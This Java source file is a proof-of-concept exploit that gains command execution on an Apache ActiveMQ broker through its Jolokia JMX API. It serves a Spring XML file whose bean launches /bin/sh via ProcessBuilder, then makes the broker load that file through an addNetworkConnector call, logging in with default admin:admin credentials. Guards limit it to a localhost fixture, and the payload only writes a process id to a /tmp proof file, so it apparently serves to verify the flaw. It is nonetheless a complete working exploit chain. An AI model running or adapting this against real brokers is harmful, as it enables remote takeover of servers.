import com.sun.net.httpserver.HttpServer;
import java.net.InetSocketAddress;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

// Native JDK HTTP client plus a static XML server. Only the genuine broker can
// execute this proof: this program serves bytes, invokes vendor JMX and observes.
public class NativeJmxProof {
  private static void binary(String key, byte[] value) {
    System.out.println(key + "=" + Base64.getEncoder().encodeToString(value));
  }

  public static void main(String[] args) throws Exception {
    Path proof = Path.of(args[0]);
    String base = args[1];
    String broker = args[2];
    String credentials = args.length > 3 ? args[3] : "admin:admin";
    if (!credentials.matches("[a-z-]+:[a-z-]+")) throw new IllegalArgumentException("Expected local fixture credentials");
    if (!proof.toString().matches("/tmp/module-target-native-jolokia-[0-9]+") || Files.exists(proof)) {
      throw new IllegalArgumentException("Expected a fresh native fixture proof path");
    }
    if (!base.matches("http://127\\.0\\.0\\.1:8161(?:/[a-z-]+)?") || !broker.matches("[a-z-]+")) {
      throw new IllegalArgumentException("Expected local fixture API and broker name");
    }
    String xml = """
      <?xml version="1.0" encoding="UTF-8"?>
      <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
       <bean id="nativeProof" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg><list><value>/bin/sh</value><value>-c</value><value><![CDATA[printf '%%s' "$PPID" > %s]]></value></list></constructor-arg>
       </bean>
      </beans>
      """.formatted(proof);
    byte[] document = xml.getBytes(StandardCharsets.UTF_8);
    List<String> requests = Collections.synchronizedList(new ArrayList<>());
    HttpServer server = HttpServer.create(new InetSocketAddress("127.0.0.1", 0), 0);
    ExecutorService executor = Executors.newFixedThreadPool(2);
    server.setExecutor(executor);
    server.createContext("/native.xml", exchange -> {
      requests.add(exchange.getRequestMethod() + " " + exchange.getRequestURI());
      exchange.getResponseHeaders().set("Content-Type", "application/xml");
      exchange.sendResponseHeaders(200, document.length);
      exchange.getResponseBody().write(document);
      exchange.close();
    });
    server.start();
    try {
      String remote = "http://127.0.0.1:" + server.getAddress().getPort() + "/native.xml";
      String discovery = "static:(vm://native" + System.nanoTime() + "?brokerConfig=xbean:" + remote + ")";
      String request = "{\"type\":\"exec\",\"mbean\":\"org.apache.activemq:type=Broker,brokerName=" + broker
        + "\",\"operation\":\"addNetworkConnector(java.lang.String)\",\"arguments\":[\"" + discovery + "\"]}";
      HttpRequest httpRequest = HttpRequest.newBuilder(URI.create(base + "/api/jolokia/"))
        .timeout(Duration.ofSeconds(3))
        .header("Authorization", "Basic " + Base64.getEncoder().encodeToString(credentials.getBytes(StandardCharsets.UTF_8)))
        .header("Origin", "http://127.0.0.1:8161")
        .header("Content-Type", "application/json")
        .POST(HttpRequest.BodyPublishers.ofString(request))
        .build();
      HttpClient client = HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(3)).build();
      HttpResponse<byte[]> response = client.send(httpRequest, HttpResponse.BodyHandlers.ofByteArray());
      System.out.println("JMX_HTTP_CODE=" + response.statusCode());
      binary("JMX_RESPONSE_BASE64", response.body());
      binary("JMX_REQUEST_BASE64", request.getBytes(StandardCharsets.UTF_8));
      binary("NATIVE_XML_BASE64", document);
      long deadline = System.nanoTime() + 2_000_000_000L;
      while (!Files.exists(proof) && System.nanoTime() < deadline) Thread.sleep(10);
      System.out.println("XML_REQUEST_COUNT=" + requests.size());
      binary("XML_REQUESTS_BASE64", String.join("\n", requests).getBytes(StandardCharsets.UTF_8));
      System.out.println("PROOF_PRESENT=" + Files.exists(proof));
      if (Files.exists(proof)) binary("PROOF_CONTENT_BASE64", Files.readAllBytes(proof));
    } finally {
      server.stop(0);
      executor.shutdownNow();
    }
  }
}
